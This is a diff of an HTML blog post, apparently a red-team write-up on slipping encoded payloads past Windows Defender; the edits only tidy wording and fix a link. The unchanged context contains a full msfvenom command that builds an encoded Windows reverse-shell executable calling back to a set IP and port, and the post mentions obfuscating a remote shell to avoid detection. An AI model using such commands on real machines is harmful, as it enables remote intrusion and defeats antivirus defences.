@@ -154,10 +154,10 @@
   <p>An example MSFVenom command: 
       <pre style="white-space: pre-wrap; word-wrap: break-word;"><code>msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp -f exe -o venom_sgn.exe  -e x64/zutto_dekiru -i 3 LHOST=176.16.4.7 LPORT=3117</code></pre></p>
 
-  <p>Another full stop by antivirus. I even tried to be cute and rename the file:</p>
+  <p>Another full stop by the antivirus. I even tried to be cute and rename the file:</p>
   <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/Def-2.png">
   <p><br></p>
-  <p>To my surprise, Defender also grabbed this payload before I could run it. If you want to learn more about how SGN works (maybe to use it better than I did) see the <a href="https://github.com/egebalci/sgn" target="_blank" rel="noopener noreferrer">new SGN release</a> and <a href="https://github.com/egebalci/sgn" target="_blank" rel="noopener noreferrer">SGN still going strong (2019)</a>.</p>
+  <p>To my surprise, Defender also grabbed this payload before I could run it. If you want to learn more about how SGN works (maybe to use it better than I did) see the <a href="https://github.com/egebalci/sgn" target="_blank" rel="noopener noreferrer">new SGN release</a> and <a href="https://cloud.google.com/blog/topics/threat-intelligence/shikata-ga-nai-encoder-still-going-strong/" target="_blank" rel="noopener noreferrer">SGN still going strong (2019)</a>.</p>
 
   <img class="img-fluid z-dept-1 rounded shadow" src="/assets/img/Def1.png">
   <p><br></p>
@@ -251,7 +251,7 @@ int main(void) {
 }
 </code></pre></p>
 
-  <p>I actually got it on github somewhere, unfortunately I no longer have the link but shoutout to whoever wrote it.</p>
+  <p>I actually got it from github, I no longer have the link but shoutout to whoever wrote it.</p>
 
   <p>This is a well written but vanilla remote shell, easy for me to add code to for the sake of obfuscation! Lets try it out vanilla first.</p>
 
